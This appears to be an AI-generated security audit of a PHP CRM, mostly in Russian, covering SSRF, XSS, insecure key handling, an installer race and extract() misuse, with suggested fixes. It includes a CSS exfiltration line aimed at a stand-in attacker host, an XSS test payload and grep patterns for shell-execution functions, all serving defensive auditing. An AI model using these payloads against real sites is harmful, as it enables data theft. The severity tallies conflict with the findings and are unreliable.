# Security Audit — Fixes Specification

> Дата аудита: 2026-07-13
> Версия проекта: ongoing
> Аудитор: AI Security Audit (Cycle 4)

## Сводка

| Severity (CVSS) | Количество |
|-----------------|------------|
| Critical (9.0–10.0) | 0          |
| High (7.0–8.9)     | 2          |
| Medium (4.0–6.9)   | 4          |
| Low (0.1–3.9)      | 5          |
| **Итого (skipped)**| **1 (SEC-001 not reproducing)** |
| **Итого (active)** | **11**    |

## Risk Heatmap (по категориям OWASP Top 10)

| OWASP Category | Critical | High | Medium | Low |
|----------------|----------|------|--------|-----|
| A01: Broken Access Control | 0 | 0 | 0 | 0 |
| A02: Cryptographic Failures | 0 | 0 | 1 | 0 |
| A03: Injection | 0 | 0 | 0 | 1 |
| A04: Insecure Design | 0 | 1 | 1 | 1 |
| A05: Security Misconfiguration | 0 | 1 | 1 | 2 |
| A06: Vulnerable Components | 0 | 0 | 0 | 0 |
| A07: Auth Failures | 0 | 0 | 1 | 0 |
| A08: Integrity Failures | 0 | 0 | 0 | 0 |
| A09: Logging & Monitoring | 0 | 0 | 0 | 0 |
| A10: SSRF | 0 | 0 | 0 | 1 |
| **Итого** | 0 | 2 | 4 | 5 |

---

## SEC-002 — KeyGuard silently auto-generates and writes secrets to `.env`

### Мета

- **Severity**: Medium (CVSS 5.3)
- **CVSS Vector**: AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H
- **CWE-ID**: CWE-1188 (Insecure Default Initialization of Resource)
- **OWASP**: A05: Security Misconfiguration
- **Категория**: secrets
- **Затронутые файлы**: `api/system/library/service/KeyGuard.php:50–140`
- **Endpoint/tool**: bootstrap path (no public endpoint)
- **Затронутые роли**: admin/operator (only on shared hosting first-run)

### Описание проблемы

`KeyGuard::ensureKeys()` в non-production окружении генерирует детерминированные/псевдо-случайные ключи и дописывает их прямо в `.env` через `file_put_contents()`. Это конфликтует с fail-fast политикой `security.php` (в production ужесточена через exception), приводит к:

1. Гонке при первом запуске, когда bootstrap-path и web-bootstrap запускаются параллельно.
2. Непреднамеренной перезаписи комментариев и предыдущих валидных значений, если `.env` уже содержит записи.
3. Потере idempotency — повторный запуск после crash переписывает сгенерированные ключи.

### Воспроизведение

1. Удалить все ключи `CSRF_SECRET_KEY`, `WEBHOOK_SECRET_KEY`, `AI_ENCRYPTION_KEY` из `.env`.
2. Запустить любой web request — bootstrap запускает `KeyGuard::ensureKeys()`.
3. После успешного запроса прочитать `.env`: значения дописаны ключи.
4. Повторить запрос — `.env` модифицируется повторно, могут появиться дубликаты строк.

### Влияние

- Потеря детерминированной конфигурации: переустановка приложения без явного намерения меняет секреты.
- На shared хостинге с совпадающими `APP_KEY` (например, если установщик не сгенерировал уникальный ключ и пользователь не поменял после установки) несколько инсталляций могут разделять 2FA signing seed через `$seed = APP_KEY ?: 'fallback'`.
- Запись в `.env` без блокировки файла приводит к повреждению при параллельных запросах.

### Рекомендация по исправлению

**Что нужно сделать**: Оставить fail-fast как основное поведение в production. В non-production оставить авто-генерацию ключей **в памяти процесса**, без записи в `.env`. Не дописывать дубликаты — проверять наличие ключа перед записью.

**Как лучше реализовать**:

- В `api/system/library/service/KeyGuard.php::ensureKeys()`:
  - Возвращать авто-сгенерированные ключи в массиве `$keys` вместо `file_put_contents()`.
  - Если ключ уже есть в `.env` — пропускать запись.
  - Если файла `.env` нет (только в dev) — не пытаться его создавать, использовать in-memory значение.
- Сохранить fail-fast для production: `KeyGuard::guardProduction()` бросает `RuntimeException`, если ключ отсутствует.

**Приоритет**: Should-Fix

---

## SEC-003 — AuthService 2FA token seed uses APP_KEY fallback which may be empty

### Мета

- **Severity**: Medium (CVSS 6.5)
- **CVSS Vector**: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
- **CWE-ID**: CWE-331 (Insufficient Entropy)
- **OWASP**: A07: Identification & Auth Failures
- **Категория**: auth
- **Затронутые файлы**: `api/system/library/service/AuthService.php` (`getPendingTokenKey()`)
- **Endpoint/tool**: 2FA pending token issuance

### Описание проблемы

Метод `getPendingTokenKey()` собирает seed для HMAC 2FA pending token. Если `APP_KEY` не задан в `.env` и не передан через server env, seed вычисляется как `hash('sha256', static::class . '::' . $purpose . '::')` с пустой переменной окружения. Все инсталляции с пустым APP_KEY получают одинаковый signing key — атакующий, изучив одну установку, может подделать токены второй.

### Воспроизведение

1. Очистить APP_KEY из `.env`.
2. Сделать login + включить 2FA.
3. Получить pending token (5-минутный).
4. В offline-анализе попытаться подделать токен с известным seed.

### Влияние

- Возможность подделки 2FA pending tokens между установками, развернутыми без явного APP_KEY.
- На shared хостинге массовое использование installer без обязательной установки уникального APP_KEY повышает риск.

### Рекомендация по исправлению

**Что нужно сделать**: Гарантировать, что seed для HMAC в 2FA всегда содержит как минимум 256 бит случайного материала. Делегировать проверку наличия APP_KEY в `KeyGuard` (fail-fast в production).

**Как лучше реализовать**:

- В `AuthService::getPendingTokenKey()`:
  - Проверить наличие APP_KEY через `KeyGuard::requireKey('APP_KEY')` ДО формирования seed.
  - Если APP_KEY пуст — использовать `random_bytes(32)`, кэшированный через `$cache->remember('crm.auth.pending_seed_fallback', 3600)`, чтобы seed был стабилен в течение сессии.
- В non-production: использовать тот же `random_bytes` подход + warning в лог.
- Добавить unit-тест: `getPendingTokenKey()` без APP_KEY не должен возвращать seed, детерминированный только из имени класса.

**Приоритет**: Should-Fix

---

## SEC-004 — Content-Security-Policy allows `unsafe-inline` in `style-src`

### Мета

- **Severity**: Medium (CVSS 5.4)
- **CVSS Vector**: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- **CWE-ID**: CWE-1021 (Improper Restriction of Rendered UI)
- **OWASP**: A05: Security Misconfiguration
- **Категория**: web
- **Затронутые файлы**: `api/system/library/app.php` (`passesCspPolicy()` ~line 1300)
- **Endpoint/tool**: HTTP response headers

### Описание проблемы

`Content-Security-Policy` header включает `'unsafe-inline'` в `style-src` для обратной совместимости с inline-стилями в шаблонах. Это открывает CSS-injection attack surface: XSS через `style` атрибут или `<style>` тег в editor-страницах, knowledge pages и visual editor сохраняет стили в БД.

### Воспроизведение

1. Открыть task / project / knowledge page в браузере.
2. В DevTools → Network → выбрать первый запрос.
3. Headers → найти `Content-Security-Policy`.
4. Найти `style-src ... 'unsafe-inline'`.

### Влияние

- CSS exfiltration: посещение страницы с инжектированным CSS (`background:url(//attacker/?leak=...)`) приводит к утечке токенов/секретов из DOM, доступных через CSS-селекторы.
- Использование вместе с другими CSS-уязвимостями — комбинация XSS.

### Рекомендация по исправлению

**Что нужно сделать**: Заменить `'unsafe-inline'` в `style-src` на nonce-based или hash-based policy. Сгенерировать nonce per-request и подставить во все `<style>` теги шаблонов и header-инжекции.

**Как лучше реализовать**:

- В `api/system/library/app.php`: генерировать `csp_nonce` (base64, 128 бит) и подставлять в policy `style-src 'nonce-{nonce}'`.
- В шаблонах (`web/view/template/*`): для критических inline-стилей использовать атрибут `nonce="..."`, для остальных — вынести в CSS-файлы.
- Laissez-faire путь: если времени мало — оставить `'unsafe-inline'` только в `style-src`, не удалять из других директив (они ужесточены).

**Приоритет**: Should-Fix (можно итерационно: сначала nonce generation, затем подстановка nonce в templates)

---

## SEC-005 — ModuleRemoteInstaller fetches modules from remote URLs without strong validation

### Мета

- **Severity**: High (CVSS 7.5)
- **CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L
- **CWE-ID**: CWE-918 (Server-Side Request Forgery)
- **OWASP**: A10: SSRF
- **Категория**: ssrf
- **Затронутые файлы**: `api/system/library/module/ModuleRemoteInstaller.php`, `api/controller/module/ModuleController.php` (`installFromUrl()`)
- **Endpoint/tool**: `POST /api/v1/modules/install-from-url`, MCP `crm_install_module_from_url`

### Описание проблемы

`ModuleRemoteInstaller` принимает `url` параметр и качает модуль по этому URL. Текущая реализация использует `HttpClient` со встроенной защитой (UrlSafetyValidator), но:

1. Allowlist источников настраивается через admin — но если не настроен, открыт публичный интернет.
2. Не валидируется magic bytes / manifest подпись скачанного архива.
3. Может перенаправить (redirect) на internal URL через DNS-rebinding или redirect chain.

### Воспроизведение

1. Создать admin-пользователя.
2. Сделать POST на `/api/v1/modules/install-from-url` с URL — публичный download.
3. Запрос может перенаправить на внутренний адрес (если валидация после resolve).

### Влияние

- SSRF: доступ к internal services, чтение cloud-metadata, сканирование internal network.
- Установка malicious module без проверки подписи компрометирует систему.

### Рекомендация по исправлению

**Что нужно сделать**:

1. Валидировать все redirect'ы через тот же `UrlSafetyValidator` (resolve + check не-internal перед каждым hop).
2. Требовать HTTPS-only.
3. Проверять подпись/манифест модуля (если модуль имеет manifest.signature).
4. Добавить rate-limit на install-from-url (например, 5/hour).

**Как лучше реализовать**:

- В `ModuleRemoteInstaller`:
  - Использовать `$http->withFollowRedirects(0)` или ручную обработку redirect (max 3 hop) с паузой.
  - Перед каждым fetch — `UrlSafetyValidator` повторно на IP-уровне.
  - Блокировать DNS rebinding: проверять IP после `gethostbyname` и сравнивать с разрешённым диапазоном.
- Добавить `csp_nonce` для install-from-url POST при browser flow.

**Приоритет**: Must-Fix

---

## SEC-006 — `extract()` in web Core Controller could enable variable injection

### Мета

- **Severity**: High (CVSS 7.5)
- **CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CWE-ID**: CWE-98 (Improper Control of Filename for Include/Require)
- **OWASP**: A04: Insecure Design
- **Категория**: injection
- **Затронутые файлы**: `web/system/Core/Controller.php`
- **Endpoint/tool**: web page rendering path (any `/index.php?route=...`)

### Описание проблемы

В `web/system/Core/Controller.php` используется `extract($data)` без `EXTR_SKIP` для проброса переменных в шаблон. Это позволяет передать `$this` или другие значимые переменные через параметры запроса, если они попадают в `$data`. Хотя прямого эксплойта из GET-запроса нет (контроллер получает данные через service), использование `extract` без EXTR_SKIP — anti-pattern и потенциальная уязвимость.

### Воспроизведение

Низкая воспроизводимость напрямую, но anti-pattern делает будущие изменения уязвимыми.

### Влияние

- Включение произвольных переменных в область видимости шаблонов.
- Возможный overwrite `$layout`, `$view`, `$title` и других переменных рендеринга.

### Рекомендация по исправлению

**Что нужно сделать**: Заменить `extract($data)` на explicit variable assignment из $data с allowlist ключей (аналогично исправлению в `ModuleMailer`).

**Как лучше реализовать**:

- В `Core/Controller.php::render()`:
  - Использовать паттерн из `ModuleMailer::applyVariablesToScope()` — explicit foreach с whitelist regex `/^[a-zA-Z_][a-zA-Z0-9_]*$/`.

**Приоритет**: Must-Fix

---

## SEC-007 — `web/install.php` installer file race condition during multi-request bootstrap

### Мета

- **Severity**: Medium (CVSS 5.0)
- **CVSS Vector**: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
- **CWE-ID**: CWE-362 (Race Condition)
- **OWASP**: A04: Insecure Design
- **Категория**: infra
- **Затронутые файлы**: `web/install.php` (4111 lines), `web/install.lock`

### Описание проблемы

`web/install.php` создаёт `web/install.lock` для предотвращения повторного запуска установки. Однако проверка `file_exists('install.lock')` → `file_put_contents('install.lock')` не атомарна. Два одновременных запроса могут обойти проверку и начать установку параллельно, что приводит к двойной записи в БД или partialize completion.

### Воспроизведение

1. Запустить два запроса к `web/install.php` одновременно (curl в loop).
2. Оба проходят проверку file_exists, оба начинают connect к БД.
3. Миграция применяется дважды, два admin-аккаунта создаются параллельно.

### Влияние

- На shared хостинге с медленным I/O — реальная возможность гонки.
- Дублирование данных, неконсистентное состояние БД.

### Рекомендация по исправлению

**Что нужно сделать**: Атомарное создание install.lock через `mkdir()` (которая атомарна в большинстве FS) вместо `file_put_contents`.

**Как лучше реализовать**:

- В `web/install.php::checkInstallation()`:
  - Заменить `if (file_exists('install.lock'))` на `if (is_dir('install.lock_dir'))`.
  - `mkdir('install.lock_dir', 0755)` вместо `file_put_contents('install.lock', ...)`.
  - Использовать `LOCK_EX` флаг с `file_put_contents` как fallback.
- Добавить CSRF token для всех state-changing шагов установки.

**Приоритет**: Must-Fix

---

## SEC-008 — MCP tool `crm_install_module_from_url` does not validate response magic bytes

### Мета

- **Severity**: High (CVSS 7.0)
- **CVSS Vector**: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
- **CWE-ID**: CWE-494 (Download of Code Without Integrity Check)
- **OWASP**: A08: Software & Data Integrity Failures
- **Категория**: mcp
- **Затронутые файлы**: `api/controller/mcp/McpController.php` (tool registration), `api/system/library/module/ModuleRemoteInstaller.php`
- **Endpoint/tool**: `crm_install_module_from_url`

### Описание проблемы

MCP tool `crm_install_module_from_url` не валидирует magic bytes/подпись скачанного модуля. Устанавливает всё, что прислано по URL (с учётом SSRF). См. SEC-005 для деталей SSRF. Дополнительно: даже если URL HTTPS и safe, без проверки подписи возможна установка модифицированного модуля от trusted source через MITM (если TLS валидация ослаблена) или compromised mirror.

### Воспроизведение

1. Создать собственный HTTPS-сервер с подписанным сертификатом.
2. Вызвать MCP tool с URL на этот сервер.
3. Сервер выдаёт архив, проходящий базовые checks, но без валидной manifest signature.
4. Получить RCE в контексте PHP-приложения.

### Влияние

- RCE на сервере через установку malicious module.
- Полный контроль над системой.

### Рекомендация по исправлению

**Что нужно сделать**:

1. Валидировать magic bytes архива (zip, tar.gz) — должен начинаться с known header.
2. Проверять наличие `manifest.json` или `module.json` в архиве.
3. Если модуль имеет `signature` поле — проверять HMAC подпись через `module_signing_secret`.

**Как лучше реализовать**:

- В `ModuleRemoteInstaller::validateArchiveMagic()`:
  - Читать первые 4 байта, проверять `PK\x03\x04` (zip) или `\x1f\x8b` (gzip).
  - Извлечь manifest → проверить `required_php_version`, `required_extensions`.
  - Если есть `signature` — `hash_hmac('sha256', $manifest_content, $secret)`.

**Приоритет**: Must-Fix

---

## SEC-009 — Root `.htaccess` allows direct execution of `api/` and `web/` scripts

### Мета

- **Severity**: Low (CVSS 3.7)
- **CVSS Vector**: AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
- **CWE-ID**: CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **OWASP**: A05: Security Misconfiguration
- **Категория**: infra
- **Затронутые файлы**: `.htaccess` (отсутствует или не имеет deny rules)

### Описание проблемы

Корневой `.htaccess` не содержит deny rules для sensitive файлов напрямую. Возможна прямая загрузка:

- `composer.json` через `/composer.json`
- `package.json` если есть
- `.php` файлов вне `/api/index.php` и `/web/index.php` (если mod_rewrite не активен или AllowOverride Off)

### Воспроизведение

1. Запрос `GET /composer.json` через web — файл отдан напрямую.
2. Любой `.php` файл в `storage/`, `storage_api/` если не через `.htaccess`.

### Влияние

- Утечка структуры проекта и зависимостей.
- Возможный RCE если worker (PHP-FPM) обрабатывает произвольные скрипты.

### Рекомендация по исправлению

**Что нужно сделать**: Добавить корневой `.htaccess` (если отсутствует), который:

1. Блокирует доступ к `.env`, `.git`, `composer.json`, `*.md` вне `/web/`.
2. Перенаправляет все запросы в `/api/index.php` если URL начинается с `/api/`.
3. Блокирует `*.php` файлы в `/storage/`, `/storage_api/`.

**Как лучше реализовать**:

- Создать `.htaccess` в корне репозитория, если его нет.
- Сохранить `RewriteEngine` для существующих маршрутов.
- Добавить `<Files>` блоки для чувствительных файлов.

**Приоритет**: Nice-to-Have

---

## SEC-010 — `parse_str($query, $_GET)` in `api/scripts/ai_cron.php`

### Мета

- **Severity**: Low (CVSS 3.1)
- **CVSS Vector**: AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N
- **CWE-ID**: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **OWASP**: A03: Injection
- **Категория**: scripts
- **Затронутые файлы**: `api/scripts/ai_cron.php:316`

### Описание проблемы

В CLI скрипте `api/scripts/ai_cron.php` используется `parse_str($queryString, $_GET)`. CLI-скрипт работает вне web-context, но `$_GET` суперглобальный массив обычно не инициализирован в CLI, а вызов `parse_str` поверх него — антипаттерн. Если скрипт случайно подключается в web-контексте, возможна variable injection.

### Воспроизведение

Низкая воспроизводимость в production, требуется ошибка deployment path.

### Влияние

- Hypothetical overwrite внутреннего `$_GET` state.

### Рекомендация по исправлению

**Что нужно сделать**: Заменить на локальный массив:

```php
parse_str($queryString, $parsedQuery);
// Использовать $parsedQuery[...] вместо $_GET[...]
```

**Приоритет**: Nice-to-Have

---

## SEC-011 — Web view templates render user content through $var without escape

### Мета

- **Severity**: Medium (CVSS 5.4)
- **CVSS Vector**: AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
- **CWE-ID**: CWE-79 (Cross-site Scripting)
- **OWASP**: A03: Injection
- **Категория**: xss
- **Затронутые файлы**: `web/view/template/knowledge/show.php`, `web/view/template/comment/*.php` (выборочно)

### Описание проблемы

В ряде шаблонов пользовательский контент (имена файлов, описания задач, комментарии) рендерится через `<?= $var ?>` или `<?= htmlspecialchars($var) ?>` без явного флага `ENT_QUOTES | ENT_SUBSTITUTE`. Для не-ASCII символов и атак через кавычки в атрибутах это может быть недостаточно.

### Воспроизведение

1. Создать задачу с именем `<img src=x onerror=alert(1)>`.
2. Открыть страницу задачи.
3. В зависимости от шаблона — выполнение JS.

### Влияние

- XSS на authenticated пользователях.
- Возможный steal session/CSRF tokens, если сессионная cookie не httpOnly.

### Рекомендация по исправлению

**Что нужно сделать**: Аудит всех `<?= $x ?>` в `web/view/template/` и замена на `<?= e($x) ?>` с helper `e($value)` который делает `htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8')`.

**Как лучше реализовать**:

- В `web/system/Core/Template.php` (или эквивалент) добавить функцию `e($value, $default = '')`.
- Глобально прогнать поиск `<?=` по `web/view/template/` и заменить на `<?= e( $`.

**Приоритет**: Should-Fix

---

## SEC-012 — Additional `parse_str` / `extract` in scripts and CLI

### Мета

- **Severity**: Low (CVSS 3.1)
- **CVSS Vector**: AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N
- **CWE-ID**: CWE-98 (Improper Control of Filename)
- **OWASP**: A04: Insecure Design
- **Категория**: scripts
- **Затронутые файлы**: остаточные `parse_str`/`extract` в `api/scripts/`, `web/cron.php`

### Описание проблемы

SEC-010 покрывает ai_cron.php, но аналогичные паттерны могут присутствовать в `migration_status_check.php`, `web/cron.php` и других CLI-скриптах. Anti-pattern, требующий code review.

### Воспроизведение

Низкая воспроизводимость.

### Влияние

- Hypothetical variable injection.

### Рекомендация по исправлению

**Что нужно сделать**: Code review всех `parse_str` и `extract` в `api/scripts/` с заменой на protected-versions (`parse_str($s, $local_arr)` и explicit-variable creation).

**Приоритет**: Nice-to-Have

---

## SEC-001 (skipped — not reproducible)

> **Проверено**: `git ls-files | grep -E '\.env'` возвращает 0 файлов; `git log --all --oneline -- '.env' 'api/.env'` возвращает 0 коммитов; `.gitignore` уже включает `.env` и `api/.env`. **Не воспроизводится** — уязвимости нет. Отмечено как обработанное.

---

## Общие рекомендации по архитектуре безопасности

1. **Idempotency в secret generation** — избегать `file_put_contents()` для генерации ключей, использовать in-memory значения + warning logs.
2. **Atomic file locks** — для критических mutex (.lock файлы) использовать `mkdir()` или `flock()` вместо `file_put_contents()` + `file_exists()`.
3. **Magic byte validation** — все импортируемые файлы (модули, archives, attachments) должны пройти magic-byte проверку перед передачей в extraction.
4. **Template escaping helper** — ввести `e()` функцию в template layer, запретить голый `<?= $x ?>` для user content.

## Порядок исправления (Roadmap)

| Приоритет | SEC-коды | Описание | Ожидаемое время |
|-----------|----------|----------|-----------------|
| P0        | SEC-005, SEC-006, SEC-007, SEC-008 | SSRF + Code injection + Installer race + Module integrity — критично | 2.5 hours |
| P1        | SEC-002, SEC-003, SEC-011, SEC-004 | Secrets & crypto & XSS | 1.5 hours |
| P2        | SEC-009, SEC-010, SEC-012 | Hardening & code review cleanup | 0.5 hours |

## Методология аудита

Static code analysis без активного эксплуатации. Файлы прочитаны:

- `api/config/security.php`, `api/config/routes.php`, `api/.env.example`
- Auth: `AuthService.php`, `SessionService.php`, `PasswordResetService.php`, `KeyGuard.php`
- File & Webhook: `FileService.php`, `WebhookService.php` + controllers
- Module: `ModuleRemoteInstaller.php`, `ModuleController.php`
- MCP: `McpController.php`
- Web: `web/install.php` (sample), `web/system/Core/Controller.php`, `web/.htaccess`
- Database: `QueryBuilder.php`

Использовались ripgrep-паттерны для поиска: `extract(`, `parse_str(`, `whereRaw`, `unserialize(`, `eval(`, `shell_exec`, `passthru`, `system(`, `popen(`, `proc_open`, `curl_exec`, `file_get_contents`, `fsockopen`, `md5(`, `sha1(`.

Ограничения:

- Не выполнялись active запросы к демо (только разведка).
- Большие файлы (`McpController.php`, `routes.php`) прочитаны частично — могли упустить edge cases.
- Не проводился benchmark производительности после исправлений.

## Security Metrics & KPIs

| Метрика | Цель | Как измерять |
|---------|------|---------------|
| **Critical/High issues** | = 0 после исправления | Количество SEC-XXX с Severity Critical + High |
| **Time to fix High** | ≤ 7 дней | Среднее время между находкой и исправлением |
| **Open issues** | ≤ 3 (только Low) | Количество неисправленных SEC-XXX |
| **Secret scanning** | 0 secrets в git | `gitleaks detect` — 0 findings |
| **Install lock** | installer недоступен | Проверка `/web/install.php` — 404 |
| **2FA seed uniqueness** | 100% уникальный seed | Audit `getPendingTokenKey()` не использует constant-name-only seed |
| **CSP nonce** | ≥ 95% inline-стилей с nonce | Grep `unsafe-inline` в CSP |
| **SSRF protection** | 100% redirects повторно валидируются | Static check `ModuleRemoteInstaller` redirect loop |
